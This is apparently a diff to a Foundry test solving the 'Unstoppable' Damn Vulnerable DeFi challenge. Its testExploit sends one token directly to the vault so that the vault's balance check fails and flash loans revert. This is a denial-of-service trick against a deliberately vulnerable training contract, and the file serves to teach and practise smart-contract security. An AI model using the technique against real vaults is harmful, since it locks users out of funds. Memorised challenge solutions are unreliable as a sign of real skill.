@@ -7,6 +7,7 @@ import {ReceiverUnstoppable} from "../../src/unstoppable/ReceiverUnstoppable.sol
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {Test, console} from "../../lib/forge-std/src/Test.sol";
+import {stdError} from "forge-std/Test.sol";
 import {StdUtils} from "../../lib/forge-std/src/StdUtils.sol";
 import {ERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
 import {IERC3156FlashBorrower, IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156.sol";
@@ -26,6 +27,7 @@ contract breakUnstoppable is Test {
     address user = makeAddr("user");
 
     function setUp() public {
+        vm.prank(owner);
         receiverUnstoppable = new ReceiverUnstoppable(address(vault));
         dvt = new DamnValuableToken();
         vault = new UnstoppableVault(
@@ -52,9 +54,9 @@ contract breakUnstoppable is Test {
 
     function testExploit() public {
         //Arrange
-        vm.deal(attacker, ATTACKER_WALLET);
+        dvt.transfer(attacker, ATTACKER_WALLET);
         vm.startPrank(attacker);
-        dvt.transfer(address(vault), ATTACKER_WALLET);
+        dvt.transfer(address(vault), 1);
 
         //Act/Assert
         vm.expectRevert("InvalidBalance");
@@ -66,7 +68,7 @@ contract breakUnstoppable is Test {
 
     function validation() internal {
         // It is no longer possible to execute flash loans
-        vm.startPrank(user);
+        vm.startPrank(owner);
         receiverUnstoppable.executeFlashLoan(10);
         vm.stopPrank();
     }
